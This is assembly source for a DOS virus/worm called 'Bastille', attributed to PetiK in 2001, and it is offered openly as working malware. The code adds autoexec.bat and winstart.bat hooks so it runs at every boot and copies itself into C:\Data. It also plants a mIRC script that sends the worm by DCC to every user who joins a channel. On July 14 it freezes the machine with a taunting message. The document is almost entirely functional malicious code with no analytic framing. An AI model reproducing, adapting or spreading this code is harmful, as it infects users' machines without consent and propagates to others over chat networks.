;Bastille Virus/Worm par PetiK le 23/04/2001 et 03/06/2001

.model small
.code

org 100h

DEBUT:jmp START
OUVRE_AUTO:
    mov ax,3D01h
    lea dx,FILE
    int 21h                 ; open autoexec.bat
    xchg ax,bx

    xor cx,cx
    mov dx,cx
    mov ax,4202h
    int 21h                 ; get to the end of file

    mov cx,AUTOL
    lea dx,DAUTO
    mov ah,40h
    int 21h                 ; write the message

    mov ah,3Eh
    int 21h

    mov ax,4301h
    lea dx,FILE
        mov cl,1
        int 21h                 ; get readonly attribute

START:  mov ah,3Ch
    xor cx,cx
    lea dx,WINSTART
    int 21h
    xchg ax,bx
    mov ah,40h
    mov cx,WINSTARTL            ; Create C:\Windows\winstart.bat
    lea dx,DWINSTART
    mov ah,40h
    int 21h
    mov ah,3Eh
    int 21h
    

COPIE_VIRUS:
    mov ah,39h
    lea dx,DIR
    int 21h                 ; Create C:\Data directory

    mov ah,3Ch
    xor cx,cx
    lea dx,COPIE
    int 21h                 ; Create C:\Data\Win32.com
    xchg ax,bx

    mov ah,40h
    mov cx,offset VRAIFIN - offset DEBUT
    lea dx,DEBUT
    int 21h                 ; write

    mov ah,3Eh
    int 21h                 ; and close


MIRC:   mov ah,3Ch
    xor cx,cx
    lea dx,MIRCF1
    int 21h
    xchg ax,bx

    mov cx,MIRCL
    lea dx,DMIRC
    mov ah,40h
    int 21h                 ; Create a script for mIRC

    mov ah,3Eh
    int 21h

    mov ah,41h
    mov dx,offset MIRCF2
    int 21h 
    mov ah,56h
    mov dx,offset MIRCF1            ; And copy to C:\mirc directory
    mov di,offset MIRCF2
    int 21h
    mov ah,41h
    mov dx,offset MIRCF1
    int 21h

DATE:   mov ah,2Ah
    int 21h
    cmp dh,7
    jnz FIN
    cmp dl,14
    jnz FIN                 ; July 14th ??

FEU:    mov ah,9
    lea dx,MSG
    int 21h
    cli                 ; yes = not good for you
    jmp $

FIN:    mov ah,4Ch
    int 21h
    

FILE        db 'C:\Autoexec.bat',00h
MIRCF1      db 'C:\script.ini',00h
MIRCF2      db 'C:\mirc\script.ini',00h
DIR     db 'C:\Data',00h
COPIE       db 'C:\Data\Win32.com',00h
WINSTART    db 'C:\Windows\winstart.bat',00h
WHO         db 'Bastille Virus/Worm by PetiK (c)2001',00h


DAUTO:      db '',0dh,0ah
            db '@echo off',0dh,0ah
        db 'cls',0dh,0ah
            db 'echo You''re infected by Bastille Virus (c)2001',0dh,0ah
        db 'echo.',0dh,0ah
        db 'echo Don''t panic ! It''s not dangerous, just fatal !!',0dh,0ah
            db 'pause'
AUTOL       equ $-DAUTO

DMIRC       db '[script]',0dh,0ah
        db 'n0=on 1:start:{',0dh,0ah
        db 'n1= .sreq ignore',0dh,0ah
        db 'n2=}',0dh,0ah   
        db 'n3=on 1:connect:/rename C:\Data\Win32.com C:\Bastille.com',0dh,0ah
        db 'n4=on 1:join:#:{',0dh,0ah
        db 'n5=if ($nick != $me) { dcc send $nick C:\Bastille.com }',0dh,0ah
        db 'n6=}',0dh,0ah
        db 'n7=on 1:disconnect:/rename C:\Bastille.com C:\Data\Win32.com'
MIRCL       equ $-DMIRC

DWINSTART   db '@echo off',0dh,0ah
        db 'if exist C:\Data\Win32.com C:\Data\Win32.com'
WINSTARTL   equ $-DWINSTART

MSG     db 7,7,7,10,13,'YOUR COMPUTER IS FOR THE MOMENT DEAD',0dh,0ah
        db 'WAIT TOMORROW TO RESTART YOUR COMPUTER',0dh,0ah,0dh,0ah
        db '            PetiK (c)2001 $'
        
    
VRAIFIN:
end DEBUT
